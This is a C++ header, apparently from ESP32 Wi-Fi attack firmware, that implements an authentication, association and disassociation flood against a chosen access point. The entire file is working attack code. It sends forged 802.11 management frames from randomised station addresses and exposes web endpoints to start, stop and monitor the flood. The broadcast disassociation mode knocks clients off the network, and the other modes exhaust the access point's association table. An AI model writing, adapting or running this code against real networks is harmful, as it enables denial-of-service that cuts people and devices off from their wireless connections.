#pragma once
#include <WiFi.h>
#include <esp_wifi.h>
#include "frames.h"
#include "module.h"
#include "safety.h"

// Auth/Assoc/Disassoc flood — exhausts AP association table or generates management noise
// mode: 0=auth  1=assoc  2=auth+assoc  3=disassoc  4=all(auth+assoc+disassoc)
static bool af_running = false;
static uint8_t af_bssid[6] = {0};
static uint8_t af_ch = 6;
static uint8_t af_mode = 2;
static String af_ssid = "target";
static volatile uint32_t af_sent = 0;
static TaskHandle_t af_task = nullptr;

static void af_run(void *) {
  uint8_t f[128];
  uint8_t sta[6];
  af_sent = 0;
  while (af_running) {
    if (!safety_rate_ok(1)) {
      vTaskDelay(pdMS_TO_TICKS(100));
      continue;
    }
    for (int k = 0; k < 6; k++)
      sta[k] = esp_random() & 0xFF;
    sta[0] = (sta[0] & 0xFC) | 0x02;
    size_t n;
    switch (af_mode) {
      case 0:
        n = f_auth(f, sta, af_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        af_sent++;
        break;
      case 1:
        n = f_assoc(f, sta, af_bssid, af_ssid.c_str());
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        af_sent++;
        break;
      case 2:
        n = f_auth(f, sta, af_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        af_sent++;
        n = f_assoc(f, sta, af_bssid, af_ssid.c_str());
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        af_sent++;
        break;
      case 3:
        n = f_disassoc(f, BC, af_bssid, 8);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        af_sent++;
        break;
      case 4:
        n = f_auth(f, sta, af_bssid);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        af_sent++;
        n = f_assoc(f, sta, af_bssid, af_ssid.c_str());
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        af_sent++;
        n = f_disassoc(f, BC, af_bssid, 8);
        esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
        af_sent++;
        break;
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
  af_task = nullptr;
  vTaskDelete(nullptr);
}

static bool af_start(const String &q) {
  int i;
  String bs, ch, mo, ss;
  if ((i = q.indexOf("bssid=")) >= 0) {
    int e = q.indexOf('&', i);
    bs = q.substring(i + 6, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ch=")) >= 0) {
    int e = q.indexOf('&', i);
    ch = q.substring(i + 3, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("mode=")) >= 0) {
    int e = q.indexOf('&', i);
    mo = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  if ((i = q.indexOf("ssid=")) >= 0) {
    int e = q.indexOf('&', i);
    ss = q.substring(i + 5, e < 0 ? q.length() : e);
  }
  if (bs.length() != 17)
    return false;
  sscanf(bs.c_str(), "%x:%x:%x:%x:%x:%x", (unsigned *)&af_bssid[0], (unsigned *)&af_bssid[1],
         (unsigned *)&af_bssid[2], (unsigned *)&af_bssid[3], (unsigned *)&af_bssid[4],
         (unsigned *)&af_bssid[5]);
  af_ch = ch.toInt();
  if (!af_ch)
    af_ch = 6;
  if (mo.length())
    af_mode = (uint8_t)mo.toInt();
  if (ss.length())
    af_ssid = ss;
  esp_wifi_set_channel(af_ch, WIFI_SECOND_CHAN_NONE);
  af_sent = 0;
  af_running = true;
  xTaskCreate(af_run, "af_run", 4096, nullptr, 5, &af_task);
  return true;
}
static void af_stop() {
  af_running = false;
}
static void af_routes() {
  extern WebServer server;
  server.on("/api/authflood/start", HTTP_POST, []() {
    String q;
    for (int i = 0; i < server.args(); i++) {
      if (i)
        q += '&';
      q += server.argName(i) + '=' + server.arg(i);
    }
    bool ok = tool_start("authflood", q);
    server.send(200, "application/json", ok ? "{\"ok\":1}" : "{\"ok\":0,\"err\":\"busy\"}");
  });
  server.on("/api/authflood/stop", HTTP_POST, []() {
    tool_stop("authflood");
    server.send(200, "application/json", "{\"ok\":1}");
  });
  server.on("/api/authflood/status", HTTP_GET, []() {
    server.send(200, "application/json",
                "{\"running\":" + String(af_running ? 1 : 0) + ",\"sent\":" + String(af_sent) +
                    ",\"msg\":\"sent " + String(af_sent) + "\"}");
  });
}
